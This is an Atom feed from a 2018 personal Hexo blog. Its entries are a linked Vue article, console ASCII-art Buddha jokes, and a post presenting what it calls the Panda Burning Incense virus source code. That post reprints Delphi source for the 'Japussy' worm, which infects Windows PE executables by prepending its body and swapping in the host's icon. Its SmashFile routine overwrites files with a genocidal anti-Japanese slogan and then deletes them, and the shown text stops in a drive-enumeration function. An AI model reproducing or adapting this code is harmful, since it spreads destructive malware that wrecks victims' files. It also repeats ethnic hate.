<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Path-Blogs</title>
  
  <subtitle>Chen&#39;s Blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-03-05T06:26:48.685Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Chen</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2018/03/05/%E4%B8%80%E4%B8%AAvue%E7%9A%84%E7%96%91%E9%9A%BE%E8%A7%A3%E7%AD%94(%E8%BD%AC)/"/>
    <id>http://yoursite.com/2018/03/05/一个vue的疑难解答(转)/</id>
    <published>2018-03-05T06:25:36.362Z</published>
    <updated>2018-03-05T06:26:48.685Z</updated>
    
    <content type="html"><![CDATA[<iframe src="https://juejin.im/post/59fa9257f265da43062a1b0e?utm_source=weibo&utm_campaign=admin" width="100%" height="1000" style="border:0;"></iframe><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;iframe src=&quot;https://juejin.im/post/59fa9257f265da43062a1b0e?utm_source=weibo&amp;utm_campaign=admin&quot; width=&quot;100%&quot; height=&quot;1000&quot; style=&quot;border:0;&quot;&gt;&lt;/iframe&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2018/03/05/%E4%BD%9B%E7%A5%96%E4%BF%9D%E4%BD%91,%E4%BB%A3%E7%A0%81%E7%A5%9E%E5%85%BD/"/>
    <id>http://yoursite.com/2018/03/05/佛祖保佑,代码神兽/</id>
    <published>2018-03-05T06:24:51.551Z</published>
    <updated>2018-03-05T06:26:32.175Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">console.log(&apos;%c&apos; +</span><br><span class="line">        &apos;\n&apos; +</span><br><span class="line">        &apos;                             _ooOoo_\n&apos; +</span><br><span class="line">        &apos;                            o8888888o\n&apos; +</span><br><span class="line">        &apos;                            88&quot; . &quot;88\n&apos; +</span><br><span class="line">        &apos;                            (| -_- |)\n&apos; +</span><br><span class="line">        &apos;                            O\\  =  /O\n&apos; +</span><br><span class="line">        &apos;                         ____/`---\&apos;\\____\n&apos; +</span><br><span class="line">        &apos;                       .\&apos;  \\\\|     |//  `.\n&apos; +</span><br><span class="line">        &apos;                      /  \\\\|||  :  |||//  \\\n&apos; +</span><br><span class="line">        &apos;                     /  _||||| -:- |||||-  \\\n&apos; +</span><br><span class="line">        &apos;                     |   | \\\\\\  -  /// |   |\n&apos; +</span><br><span class="line">        &apos;                     | \\_|  \&apos;\&apos;\\---/\&apos;\&apos;  |   |\n&apos; +</span><br><span class="line">        &apos;                     \\  .-\\__  `-`  ___/-. /\n&apos; +</span><br><span class="line">        &apos;                   ___`. .\&apos;  /--.--\\  `. . __\n&apos; +</span><br><span class="line">        &apos;                .&quot;&quot; \&apos;&lt;  `.___\\_&lt;|&gt;_/___.\&apos;  &gt;\&apos;&quot;&quot;.\n&apos; +</span><br><span class="line">        &apos;               | | :  `- \\`.;`\\ _ /`;.`/ - ` : | |\n&apos; +</span><br><span class="line">        &apos;               \\  \\ `-.   \\_ __\\ /__ _/   .-` /  /\n&apos; +</span><br><span class="line">        &apos;          ======`-.____`-.___\\_____/___.-`____.-\&apos;======\n&apos; +</span><br><span class="line">        &apos;                             `=---=\&apos;\n&apos; +</span><br><span class="line">        &apos;          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n&apos; +</span><br><span class="line">        &apos;            佛曰:\n&apos; +</span><br><span class="line">        &apos;                   写字楼里写字间，写字间里程序员；\n&apos; +</span><br><span class="line">        &apos;                   程序人员写程序，又拿程序换酒钱。\n&apos; +</span><br><span class="line">        &apos;                   酒醒只在网上坐，酒醉还来网下眠；\n&apos; +</span><br><span class="line">        &apos;                   酒醉酒醒日复日，网上网下年复年。\n&apos; +</span><br><span class="line">        &apos;                   但愿老死电脑间，不愿鞠躬老板前；\n&apos; +</span><br><span class="line">        &apos;                   奔驰宝马贵者趣，公交自行程序员。\n&apos; +</span><br><span class="line">        &apos;                   别人笑我忒疯癫，我笑自己命太贱；\n&apos; +</span><br><span class="line">        &apos;                   不见满街漂亮妹，哪个归得程序员？\n&apos; +</span><br><span class="line">        &apos;\n&apos; +</span><br><span class="line">        &apos; ---------------------------------------------------------------------\n&apos; +</span><br><span class="line">        &apos;\n&apos; +</span><br><span class="line">        &apos;////////////////////////////////////////////////////////////////////\n&apos; +</span><br><span class="line">        &apos;//                          _ooOoo_                               //\n&apos; +</span><br><span class="line">        &apos;//                         o8888888o                              //\n&apos; +</span><br><span class="line">        &apos;//                         88&quot; . &quot;88                              //\n&apos; +</span><br><span class="line">        &apos;//                         (| ^_^ |)                              //\n&apos; +</span><br><span class="line">        &apos;//                         O\\  =  /O                              //\n&apos; +</span><br><span class="line">        &apos;//                      ____/`---\&apos;\\____                           //\n&apos; +</span><br><span class="line">        &apos;//                    .\&apos;  \\\\|     |//  `.                         //\n&apos; +</span><br><span class="line">        &apos;//                   /  \\\\|||  :  |||//  \\                        //\n&apos; +</span><br><span class="line">        &apos;//                  /  _||||| -:- |||||-  \\                       //\n&apos; +</span><br><span class="line">        &apos;//                  |   | \\\\\\  -  /// |   |                       //\n&apos; +</span><br><span class="line">        &apos;//                  | \\_|  \&apos;\&apos;\\---/\&apos;\&apos;  |   |                       //\n&apos; +</span><br><span class="line">        &apos;//                  \\  .-\\__  `-`  ___/-. /                       //\n&apos; +</span><br><span class="line">        &apos;//                ___`. .\&apos;  /--.--\\  `. . ___                     //\n&apos; +</span><br><span class="line">        &apos;//              .&quot;&quot; \&apos;&lt;  `.___\\_&lt;|&gt;_/___.\&apos;  &gt;\&apos;&quot;&quot;.                  //\n&apos; +</span><br><span class="line">        &apos;//            | | :  `- \\`.;`\\ _ /`;.`/ - ` : | |                 //\n&apos; +</span><br><span class="line">        &apos;//            \\  \\ `-.   \\_ __\\ /__ _/   .-` /  /                 //\n&apos; +</span><br><span class="line">        &apos;//      ========`-.____`-.___\\_____/___.-`____.-\&apos;========         //\n&apos; +</span><br><span class="line">        &apos;//                           `=---=\&apos;                              //\n&apos; +</span><br><span class="line">        &apos;//      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^        //\n&apos; +</span><br><span class="line">        &apos;//           佛祖保佑       永无BUG     永不修改                  //\n&apos; +</span><br><span class="line">        &apos;////////////////////////////////////////////////////////////////////\n&apos;+</span><br><span class="line">        &apos;\n&apos; +</span><br><span class="line">        &apos; ---------------------------------------------------------------------\n&apos; +</span><br><span class="line">        &apos;\n&apos; +</span><br><span class="line">        &apos;//   ┏┓　　　┏┓\n&apos; +</span><br><span class="line">        &apos;// ┏┛┻━━━┛┻┓\n&apos; +</span><br><span class="line">        &apos;// ┃　　　　　　　┃ 　\n&apos; +</span><br><span class="line">        &apos;// ┃　　　━　　　┃\n&apos; +</span><br><span class="line">        &apos;// ┃　┳┛　┗┳　┃\n&apos; +</span><br><span class="line">        &apos;// ┃　　　　　　　┃\n&apos; +</span><br><span class="line">        &apos;// ┃　　　┻　　　┃\n&apos; +</span><br><span class="line">        &apos;// ┃　　　　　　　┃\n&apos; +</span><br><span class="line">        &apos;// ┗━┓　　　┏━┛\n&apos; +</span><br><span class="line">        &apos;//     ┃　　　┃ 神兽保佑　　　　　　　　\n&apos; +</span><br><span class="line">        &apos;//     ┃　　　┃ 代码无BUG！\n&apos; +</span><br><span class="line">        &apos;//     ┃　　　┗━━━┓\n&apos; +</span><br><span class="line">        &apos;//     ┃　　　　　　　┣┓\n&apos; +</span><br><span class="line">        &apos;//     ┃　　　　　　　┏┛\n&apos; +</span><br><span class="line">        &apos;//     ┗┓┓┏━┳┓┏┛\n&apos; +</span><br><span class="line">        &apos;//       ┃┫┫　┃┫┫\n&apos; +</span><br><span class="line">        &apos;//       ┗┻┛　┗┻┛\n&apos; +</span><br><span class="line">        &apos;\n&apos; +</span><br><span class="line">        &apos; ---------------------------------------------------------------------\n&apos; +</span><br><span class="line">        &apos;\n&apos; +</span><br><span class="line">        &apos;                       江城子 . 程序员之歌\n&apos; +</span><br><span class="line">        &apos; \n&apos; +</span><br><span class="line">        &apos;                   十年生死两茫茫，写程序，到天亮。\n&apos; +</span><br><span class="line">        &apos;                       千行代码，Bug何处藏。\n&apos; +</span><br><span class="line">        &apos;                   纵使上线又怎样，朝令改，夕断肠。\n&apos; +</span><br><span class="line">        &apos; \n&apos; +</span><br><span class="line">        &apos;                   领导每天新想法，天天改，日日忙。\n&apos; +</span><br><span class="line">        &apos;                       相顾无言，惟有泪千行。\n&apos; +</span><br><span class="line">        &apos;                   每晚灯火阑珊处，夜难寐，加班狂。&apos; +</span><br><span class="line">        &apos;\n&apos; +</span><br><span class="line">        &apos; ---------------------------------------------------------------------\n&apos; +</span><br><span class="line">        &apos;\n&apos;</span><br><span class="line">        , &apos;color:green;font-size:14px;font-weight:200;font-family: cursive;&apos;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2018/03/05/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E6%BA%90%E7%A0%81/"/>
    <id>http://yoursite.com/2018/03/05/熊猫烧香源码/</id>
    <published>2018-03-05T06:24:23.308Z</published>
    <updated>2018-03-05T06:26:15.380Z</updated>
    
    <content type="html"><![CDATA[<h3 id="熊猫烧香源码"><a href="#熊猫烧香源码" class="headerlink" title="熊猫烧香源码"></a>熊猫烧香源码</h3><hr><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line">代码:--------------------------------------------------------------------------------</span><br><span class="line">program Japussy;</span><br><span class="line">uses</span><br><span class="line">Windows, SysUtils, Classes, Graphics, ShellAPI&#123;, Registry&#125;;</span><br><span class="line">const</span><br><span class="line">HeaderSize = 82432; //病毒体的大小</span><br><span class="line">IconOffset = $12EB8; //PE文件主图标的偏移量</span><br><span class="line"> </span><br><span class="line">//在我的Delphi5 SP1上面编译得到的大小，其它版本的Delphi可能不同</span><br><span class="line">//查找2800000020的十六进制字符串可以找到主图标的偏移量</span><br><span class="line"> </span><br><span class="line">&#123;</span><br><span class="line">HeaderSize = 38912; //Upx压缩过病毒体的大小</span><br><span class="line">IconOffset = $92BC; //Upx压缩过PE文件主图标的偏移量</span><br><span class="line"> </span><br><span class="line">//Upx 1.24W 用法: upx -9 --8086 Japussy.exe</span><br><span class="line">&#125;</span><br><span class="line">IconSize = $2E8; //PE文件主图标的大小--744字节</span><br><span class="line">IconTail = IconOffset + IconSize; //PE文件主图标的尾部</span><br><span class="line">ID = $44444444; //感染标记</span><br><span class="line"> </span><br><span class="line">//垃圾码，以备写入</span><br><span class="line">Catchword = &apos;If a race need to be killed out, it must be Yamato. &apos; +</span><br><span class="line">&apos;If a country need to be destroyed, it must be Japan! &apos; +</span><br><span class="line">&apos;*** W32.Japussy.Worm.A ***&apos;;</span><br><span class="line">&#123;$R *.RES&#125;</span><br><span class="line">function RegisterServiceProcess(dwProcessID, dwType: Integer): Integer;</span><br><span class="line">stdcall; external &apos;Kernel32.dll&apos;; //函数声明</span><br><span class="line">var</span><br><span class="line">TmpFile: string;</span><br><span class="line">Si: STARTUPINFO;</span><br><span class="line">Pi: PROCESS_INFORMATION;</span><br><span class="line">IsJap: Boolean = False; //日文操作系统标记</span><br><span class="line">&#123; 判断是否为Win9x &#125;</span><br><span class="line">function IsWin9x: Boolean;</span><br><span class="line">var</span><br><span class="line">Ver: TOSVersionInfo;</span><br><span class="line">begin</span><br><span class="line">Result := False;</span><br><span class="line">Ver.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);</span><br><span class="line">if not GetVersionEx(Ver) then</span><br><span class="line">Exit;</span><br><span class="line">if (Ver.dwPlatformID = VER_PLATFORM_WIN32_WINDOWS) then //Win9x</span><br><span class="line">Result := True;</span><br><span class="line">end;</span><br><span class="line">&#123; 在流之间复制 &#125;</span><br><span class="line">procedure CopyStream(Src: TStream; sStartPos: Integer; Dst: TStream;</span><br><span class="line">dStartPos: Integer; Count: Integer);</span><br><span class="line">var</span><br><span class="line">sCurPos, dCurPos: Integer;</span><br><span class="line">begin</span><br><span class="line">sCurPos := Src.Position;</span><br><span class="line">dCurPos := Dst.Position;</span><br><span class="line">Src.Seek(sStartPos, 0);</span><br><span class="line">Dst.Seek(dStartPos, 0);</span><br><span class="line">Dst.CopyFrom(Src, Count);</span><br><span class="line">Src.Seek(sCurPos, 0);</span><br><span class="line">Dst.Seek(dCurPos, 0);</span><br><span class="line">end;</span><br><span class="line">&#123; 将宿主文件从已感染的PE文件中分离出来，以备使用 &#125;</span><br><span class="line">procedure ExtractFile(FileName: string);</span><br><span class="line">var</span><br><span class="line">sStream, dStream: TFileStream;</span><br><span class="line">begin</span><br><span class="line">try</span><br><span class="line">sStream := TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);</span><br><span class="line">try</span><br><span class="line">dStream := TFileStream.Create(FileName, fmCreate);</span><br><span class="line">try</span><br><span class="line">sStream.Seek(HeaderSize, 0); //跳过头部的病毒部分</span><br><span class="line">dStream.CopyFrom(sStream, sStream.Size - HeaderSize);</span><br><span class="line">finally</span><br><span class="line">dStream.Free;</span><br><span class="line">end;</span><br><span class="line">finally</span><br><span class="line">sStream.Free;</span><br><span class="line">end;</span><br><span class="line">except</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">&#123; 填充STARTUPINFO结构 &#125;</span><br><span class="line">procedure FillStartupInfo(var Si: STARTUPINFO; State: Word);</span><br><span class="line">begin</span><br><span class="line">Si.cb := SizeOf(Si);</span><br><span class="line">Si.lpReserved := nil;</span><br><span class="line">Si.lpDesktop := nil;</span><br><span class="line">Si.lpTitle := nil;</span><br><span class="line">Si.dwFlags := STARTF_USESHOWWINDOW;</span><br><span class="line">Si.wShowWindow := State;</span><br><span class="line">Si.cbReserved2 := 0;</span><br><span class="line">Si.lpReserved2 := nil;</span><br><span class="line">end;</span><br><span class="line">&#123; 发带毒邮件 &#125;</span><br><span class="line">procedure SendMail;</span><br><span class="line">begin</span><br><span class="line">//哪位仁兄愿意完成之？</span><br><span class="line">end;</span><br><span class="line">&#123; 感染PE文件 &#125;</span><br><span class="line">procedure InfectOneFile(FileName: string);</span><br><span class="line">var</span><br><span class="line">HdrStream, SrcStream: TFileStream;</span><br><span class="line">IcoStream, DstStream: TMemoryStream;</span><br><span class="line">iID: LongInt;</span><br><span class="line">aIcon: TIcon;</span><br><span class="line">Infected, IsPE: Boolean;</span><br><span class="line">i: Integer;</span><br><span class="line">Buf: array[0..1] of Char;</span><br><span class="line">begin</span><br><span class="line">try //出错则文件正在被使用，退出</span><br><span class="line">if CompareText(FileName, &apos;JAPUSSY.EXE&apos;) = 0 then //是自己则不感染</span><br><span class="line">Exit;</span><br><span class="line">Infected := False;</span><br><span class="line">IsPE := False;</span><br><span class="line">SrcStream := TFileStream.Create(FileName, fmOpenRead);</span><br><span class="line">try</span><br><span class="line">for i := 0 to $108 do //检查PE文件头</span><br><span class="line">begin</span><br><span class="line">SrcStream.Seek(i, soFromBeginning);</span><br><span class="line">SrcStream.Read(Buf, 2);</span><br><span class="line">if (Buf[0] = #80) and (Buf[1] = #69) then //PE标记</span><br><span class="line">begin</span><br><span class="line">IsPE := True; //是PE文件</span><br><span class="line">Break;</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">SrcStream.Seek(-4, soFromEnd); //检查感染标记</span><br><span class="line">SrcStream.Read(iID, 4);</span><br><span class="line">if (iID = ID) or (SrcStream.Size &lt; 10240) then //太小的文件不感染</span><br><span class="line">Infected := True;</span><br><span class="line">finally</span><br><span class="line">SrcStream.Free;</span><br><span class="line">end;</span><br><span class="line">if Infected or (not IsPE) then //如果感染过了或不是PE文件则退出</span><br><span class="line">Exit;</span><br><span class="line">IcoStream := TMemoryStream.Create;</span><br><span class="line">DstStream := TMemoryStream.Create;</span><br><span class="line">try</span><br><span class="line">aIcon := TIcon.Create;</span><br><span class="line">try</span><br><span class="line">//得到被感染文件的主图标(744字节)，存入流</span><br><span class="line">aIcon.ReleaseHandle;</span><br><span class="line">aIcon.Handle := ExtractIcon(HInstance, PChar(FileName), 0);</span><br><span class="line">aIcon.SaveToStream(IcoStream);</span><br><span class="line">finally</span><br><span class="line">aIcon.Free;</span><br><span class="line">end;</span><br><span class="line">SrcStream := TFileStream.Create(FileName, fmOpenRead);</span><br><span class="line">//头文件</span><br><span class="line">HdrStream := TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);</span><br><span class="line">try</span><br><span class="line">//写入病毒体主图标之前的数据</span><br><span class="line">CopyStream(HdrStream, 0, DstStream, 0, IconOffset);</span><br><span class="line">//写入目前程序的主图标</span><br><span class="line">CopyStream(IcoStream, 22, DstStream, IconOffset, IconSize);</span><br><span class="line">//写入病毒体主图标到病毒体尾部之间的数据</span><br><span class="line">CopyStream(HdrStream, IconTail, DstStream, IconTail, HeaderSize - IconTail);</span><br><span class="line">//写入宿主程序</span><br><span class="line">CopyStream(SrcStream, 0, DstStream, HeaderSize, SrcStream.Size);</span><br><span class="line">//写入已感染的标记</span><br><span class="line">DstStream.Seek(0, 2);</span><br><span class="line">iID := $44444444;</span><br><span class="line">DstStream.Write(iID, 4);</span><br><span class="line">finally</span><br><span class="line">HdrStream.Free;</span><br><span class="line">end;</span><br><span class="line">finally</span><br><span class="line">SrcStream.Free;</span><br><span class="line">IcoStream.Free;</span><br><span class="line">DstStream.SaveToFile(FileName); //替换宿主文件</span><br><span class="line">DstStream.Free;</span><br><span class="line">end;</span><br><span class="line">except;</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line"> </span><br><span class="line">&#123; 将目标文件写入垃圾码后删除 &#125;</span><br><span class="line">procedure SmashFile(FileName: string);</span><br><span class="line">var</span><br><span class="line">FileHandle: Integer;</span><br><span class="line">i, Size, Mass, Max, Len: Integer;</span><br><span class="line">begin</span><br><span class="line">try</span><br><span class="line">SetFileAttributes(PChar(FileName), 0); //去掉只读属性</span><br><span class="line">FileHandle := FileOpen(FileName, fmOpenWrite); //打开文件</span><br><span class="line">try</span><br><span class="line">Size := GetFileSize(FileHandle, nil); //文件大小</span><br><span class="line">i := 0;</span><br><span class="line">Randomize;</span><br><span class="line">Max := Random(15); //写入垃圾码的随机次数</span><br><span class="line">if Max &lt; 5 then</span><br><span class="line">Max := 5;</span><br><span class="line">Mass := Size div Max; //每个间隔块的大小</span><br><span class="line">Len := Length(Catchword);</span><br><span class="line">while i &lt; Max do</span><br><span class="line">begin</span><br><span class="line">FileSeek(FileHandle, i * Mass, 0); //定位</span><br><span class="line">//写入垃圾码，将文件彻底破坏掉</span><br><span class="line">FileWrite(FileHandle, Catchword, Len);</span><br><span class="line">Inc(i);</span><br><span class="line">end;</span><br><span class="line">finally</span><br><span class="line">FileClose(FileHandle); //关闭文件</span><br><span class="line">end;</span><br><span class="line">DeleteFile(PChar(FileName)); //删除之</span><br><span class="line">except</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">&#123; 获得可写的驱动器列表 &#125;</span><br><span class="line">function GetDrives: string;</span><br><span class="line">var</span><br><span class="line">DiskType: Word;</span><br><span class="line">D: Char;</span><br><span class="line">Str: string;</span><br><span class="line">i: Integer;</span><br><span class="line">begin</span><br><span class="line">for i := 0 to 25 do //遍历26个字母</span><br><span class="line">begin</span><br><span class="line">D := Chr(i + 65);</span><br><span class="line">Str := D + 